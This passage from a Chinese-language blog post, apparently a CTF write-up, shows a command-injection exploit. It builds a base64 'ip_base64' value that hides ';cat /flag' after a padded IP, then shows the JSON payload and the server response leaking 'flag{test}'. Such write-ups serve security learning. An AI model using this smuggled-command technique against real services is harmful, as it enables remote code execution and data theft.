+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;dGVzdA==Y29tbWFuZA==&#39;</span> | base64 -d
+</span></span><span style=display:flex><span>testcommand
+</span></span></code></pre></div><p>只需要构造一个base64编码后有填充符的ip，后面跟上base64编码的命令就能实现rce：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ echo -n <span style=color:#e6db74>&#39;8.8.8.8&#39;</span> | base64 | tr -d <span style=color:#e6db74>&#39;\n&#39;</span>; echo -n <span style=color:#e6db74>&#39;;cat /flag&#39;</span> | base64
+</span></span><span style=display:flex><span>OC44LjguOA<span style=color:#f92672>==</span>O2NhdCAvZmxhZw<span style=color:#f92672>==</span>
+</span></span></code></pre></div><p>payload：</p><pre tabindex=0><code>{&#34;ip_base64&#34;:&#34;OC44LjguOA==O2NhdCAvZmxhZw==&#34;}
+</code></pre><p>response：</p><pre tabindex=0><code>{&#34;output&#34;:&#34;PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=66.5 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 66.546/66.546/66.546/0.000 ms\nflag{test}\n&#34;,&#34;success&#34;:true}
+</code></pre></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://z9nn8w.github.io/>w8nn9z Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
